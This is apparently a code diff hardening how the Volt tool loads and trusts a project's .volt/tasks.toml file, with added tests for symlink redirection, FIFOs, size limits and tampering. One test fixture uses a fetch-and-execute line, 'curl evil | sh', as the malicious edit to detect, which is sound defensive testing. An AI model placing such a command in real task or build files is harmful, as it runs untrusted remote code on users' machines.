@@ -1,13 +1,15 @@
 //! Project tasks: `.volt/tasks.toml`, plus the trust store that gates them.
 //!
 //! A tasks file is project code. One that arrives with a clone or a pull is
-//! someone else's commands, so Volt runs nothing from it until the user has
-//! reviewed that exact content. Trust is a byte-for-byte copy of the reviewed
+//! someone else's commands: automatic execution requires file-wide trust.
+//! The UI may separately ask to run one reviewed command once, without changing
+//! this trust store. Trust is a byte-for-byte copy of the reviewed
 //! file kept in Volt's config folder; any edit makes the file untrusted again.
 //! Files Volt itself writes (from the Add task form) are trusted on save.
 use serde::Deserialize;
-use std::io::{self, Write};
+use std::io::{self, Read, Write};
 use std::path::{Path, PathBuf};
+use std::sync::Arc;
 
 pub const TASKS_DIR: &str = ".volt";
 pub const TASKS_FILE: &str = "tasks.toml";
@@ -15,6 +17,12 @@ pub const MAX_TASKS: usize = 32;
 pub const MAX_FILE_BYTES: u64 = 64 * 1024;
 pub const MAX_NAME_CHARS: usize = 48;
 pub const MAX_RUN_CHARS: usize = 1000;
+
+#[derive(Clone, Copy, Debug, PartialEq, Eq)]
+pub enum SaveOutcome {
+    Trusted,
+    NeedsReview,
+}
 
 /// One task as written in the file.
 #[derive(Debug, Clone, Default, PartialEq, Eq, Deserialize)]
@@ -48,6 +56,8 @@ pub struct ProjectTasks {
     pub trusted: bool,
     /// Why the file couldn't be used, if it exists but is invalid.
     pub problem: Option<String>,
+    /// Exact bytes shown to the user before Trust was clicked. Cheap to clone.
+    pub source_bytes: Option<Arc<[u8]>>,
 }
 
 impl ProjectTasks {
@@ -156,11 +166,36 @@ pub fn parse(text: &str) -> Result<Vec<TaskDef>, String> {
 
 /// Read the file's bytes: regular files only (no symlinks), size-capped.
 fn read_bytes(file: &Path) -> io::Result<Option<Vec<u8>>> {
-    let meta = match std::fs::symlink_metadata(file) {
-        Ok(meta) => meta,
+    // Check the .volt directory itself too: an untrusted checkout must not
+    // redirect task loading through a parent symlink.
+    if let Some(parent) = file.parent() {
+        match std::fs::symlink_metadata(parent) {
+            Ok(meta) if !meta.is_dir() => {
+                return Err(io::Error::new(
+                    io::ErrorKind::InvalidData,
+                    "symlinked tasks directory",
+                ));
+            }
+            Ok(_) => {}
+            Err(err) if err.kind() == io::ErrorKind::NotFound => return Ok(None),
+            Err(err) => return Err(err),
+        }
+    }
+    let mut options = std::fs::OpenOptions::new();
+    options.read(true);
+    #[cfg(unix)]
+    {
+        use std::os::unix::fs::OpenOptionsExt;
+        // A checkout can contain a FIFO at this path. Nonblocking open lets
+        // the metadata check below reject it instead of freezing the UI.
+        options.custom_flags(libc::O_NOFOLLOW | libc::O_NONBLOCK);
+    }
+    let handle = match options.open(file) {
+        Ok(handle) => handle,
         Err(err) if err.kind() == io::ErrorKind::NotFound => return Ok(None),
         Err(err) => return Err(err),
     };
+    let meta = handle.metadata()?;
     if !meta.is_file() {
         return Err(io::Error::new(
             io::ErrorKind::InvalidData,
@@ -173,7 +208,15 @@ fn read_bytes(file: &Path) -> io::Result<Option<Vec<u8>>> {
             "larger than 64 KB",
         ));
     }
-    std::fs::read(file).map(Some)
+    let mut bytes = Vec::with_capacity(meta.len().min(MAX_FILE_BYTES) as usize);
+    handle.take(MAX_FILE_BYTES + 1).read_to_end(&mut bytes)?;
+    if bytes.len() as u64 > MAX_FILE_BYTES {
+        return Err(io::Error::new(
+            io::ErrorKind::InvalidData,
+            "larger than 64 KB",
+        ));
+    }
+    Ok(Some(bytes))
 }
 
 /// Load the tasks for `root`, checking trust against `trust_dir`.
@@ -207,6 +250,7 @@ pub fn load(root: &Path, trust_dir: Option<&Path>) -> ProjectTasks {
     }
     out.trusted = trust_dir
         .is_some_and(|dir| std::fs::read(trust_copy(dir, &file)).is_ok_and(|copy| copy == bytes));
+    out.source_bytes = Some(Arc::from(bytes));
     out
 }
 
@@ -229,11 +273,27 @@ pub fn trust_dir() -> Option<PathBuf> {
 }
 
 /// Record the file's current content as reviewed.
-pub fn trust(root: &Path, trust_dir: &Path) -> io::Result<()> {
+#[cfg(test)]
+fn trust(root: &Path, trust_dir: &Path) -> io::Result<()> {
     let file = tasks_file(root);
     let bytes = read_bytes(&file)?
         .ok_or_else(|| io::Error::new(io::ErrorKind::NotFound, "no tasks file"))?;
     write_atomically(&trust_copy(trust_dir, &file), &bytes, 0o600)
+}
+
+/// Trust only the exact bytes the card displayed. A file changed between
+/// rendering the review and clicking Trust must be reviewed again.
+pub fn trust_reviewed(root: &Path, trust_dir: &Path, reviewed: &[u8]) -> io::Result<()> {
+    let file = tasks_file(root);
+    let current = read_bytes(&file)?
+        .ok_or_else(|| io::Error::new(io::ErrorKind::NotFound, "no tasks file"))?;
+    if current != reviewed {
+        return Err(io::Error::new(
+            io::ErrorKind::InvalidData,
+            "tasks file changed; review it again",
+        ));
+    }
+    write_atomically(&trust_copy(trust_dir, &file), reviewed, 0o600)
 }
 
 fn write_atomically(target: &Path, bytes: &[u8], mode: u32) -> io::Result<()> {
@@ -289,11 +349,18 @@ pub fn save(
     index: Option<usize>,
     task: Option<&TaskDef>,
     trust_dir: Option<&Path>,
-) -> Result<(), String> {
+) -> Result<SaveOutcome, String> {
     if let Some(task) = task {
         validate(task).map_err(|e| capitalize(&e))?;
     }
     let file = tasks_file(root);
+    // Never write through a symlinked .volt directory into an unrelated path.
+    let task_dir = root.join(TASKS_DIR);
+    if let Ok(meta) = std::fs::symlink_metadata(&task_dir) {
+        if !meta.is_dir() {
+            return Err(".volt must be a real directory, not a symlink or file.".into());
+        }
+    }
     let existing = read_bytes(&file).map_err(|e| format!("Couldn't read .volt/tasks.toml: {e}"))?;
     let fresh = existing.is_none();
     let was_trusted = match (&existing, trust_dir) {
@@ -357,7 +424,13 @@ pub fn save(
             }
             tables.remove(i);
         }
-        (None, None) => return Ok(()),
+        (None, None) => {
+            return Ok(if was_trusted {
+                SaveOutcome::Trusted
+            } else {
+                SaveOutcome::NeedsReview
+            })
+        }
     }
     // A new file starts with a short explanation above the first task.
     let out = if fresh {
@@ -365,13 +438,20 @@ pub fn save(
     } else {
         doc.to_string()
     };
+    if out.len() as u64 > MAX_FILE_BYTES {
+        return Err("The tasks file would exceed 64 KB.".into());
+    }
     parse(&out).map_err(|e| format!("Couldn't save: {e}"))?;
     write_atomically(&file, out.as_bytes(), 0o644)
         .map_err(|e| format!("Couldn't save .volt/tasks.toml: {e}"))?;
     if let Some(dir) = trust_dir.filter(|_| was_trusted) {
-        trust(root, dir).map_err(|e| format!("Saved, but couldn't record it as trusted: {e}"))?;
+        if trust_reviewed(root, dir, out.as_bytes()).is_ok() {
+            return Ok(SaveOutcome::Trusted);
+        }
     }
-    Ok(())
+    // The file is already saved. A trust-store failure must not make callers
+    // retry the write and accidentally create a duplicate task.
+    Ok(SaveOutcome::NeedsReview)
 }
 
 fn task_table(task: &TaskDef, old: Option<&toml_edit::Table>) -> toml_edit::Table {
@@ -566,6 +646,64 @@ mod tests {
     }
 
     #[test]
+    fn trust_refuses_bytes_changed_after_the_card_review() {
+        let root = temp_dir();
+        let trust_store = temp_dir();
+        std::fs::create_dir_all(root.join(".volt")).unwrap();
+        std::fs::write(tasks_file(&root), "[[task]]\nname='Build'\nrun='make'\n").unwrap();
+        let reviewed = load(&root, Some(&trust_store));
+        let bytes = reviewed.source_bytes.unwrap();
+        std::fs::write(
+            tasks_file(&root),
+            "[[task]]\nname='Build'\nrun='curl evil | sh'\n",
+        )
+        .unwrap();
+        assert!(trust_reviewed(&root, &trust_store, &bytes).is_err());
+        assert!(!load(&root, Some(&trust_store)).trusted);
+    }
+
+    #[test]
+    fn saving_refuses_a_file_that_would_be_too_large_to_reload() {
+        let root = temp_dir();
+        std::fs::create_dir_all(root.join(".volt")).unwrap();
+        std::fs::write(tasks_file(&root), format!("#{}\n", "x".repeat(65_500))).unwrap();
+        assert!(save(&root, None, Some(&task("Build", "make")), None)
+            .unwrap_err()
+            .contains("64 KB"));
+    }
+
+    #[cfg(unix)]
+    #[test]
+    fn loading_a_fifo_does_not_wait_for_a_writer() {
+        use std::ffi::CString;
+        use std::os::unix::ffi::OsStrExt;
+        let root = temp_dir();
+        std::fs::create_dir_all(root.join(".volt")).unwrap();
+        let name = CString::new(tasks_file(&root).as_os_str().as_bytes()).unwrap();
+        assert_eq!(unsafe { libc::mkfifo(name.as_ptr(), 0o600) }, 0);
+        assert!(load(&root, None).problem.is_some());
+        assert!(save(&root, None, Some(&task("Build", "make")), None).is_err());
+    }
+
+    #[test]
+    fn a_saved_task_is_reported_as_saved_even_when_trust_store_fails() {
+        let root = temp_dir();
+        let trust_store = root.join("not-a-directory");
+        std::fs::write(&trust_store, "blocked").unwrap();
+        let outcome = save(
+            &root,
+            None,
+            Some(&task("Build", "make")),
+            Some(&trust_store),
+        )
+        .unwrap();
+        assert_eq!(outcome, SaveOutcome::NeedsReview);
+        let loaded = load(&root, Some(&trust_store));
+        assert_eq!(loaded.tasks.len(), 1);
+        assert!(!loaded.trusted);
+    }
+
+    #[test]
     fn saving_refuses_duplicates_bad_tasks_and_broken_files() {
         let root = temp_dir();
         save(&root, None, Some(&task("Build", "make")), None).unwrap();
@@ -597,5 +735,18 @@ mod tests {
         std::fs::create_dir_all(big.join(".volt")).unwrap();
         std::fs::write(tasks_file(&big), "#".repeat(70 * 1024)).unwrap();
         assert!(load(&big, None).problem.is_some());
+
+        let redirected = temp_dir();
+        let destination = temp_dir();
+        std::os::unix::fs::symlink(&destination, redirected.join(".volt")).unwrap();
+        std::fs::write(
+            destination.join("tasks.toml"),
+            "[[task]]\nname='X'\nrun='y'\n",
+        )
+        .unwrap();
+        assert!(load(&redirected, None).problem.is_some());
+        std::fs::remove_file(destination.join("tasks.toml")).unwrap();
+        assert!(save(&redirected, None, Some(&task("Build", "make")), None).is_err());
+        assert!(!destination.join("tasks.toml").exists());
     }
 }
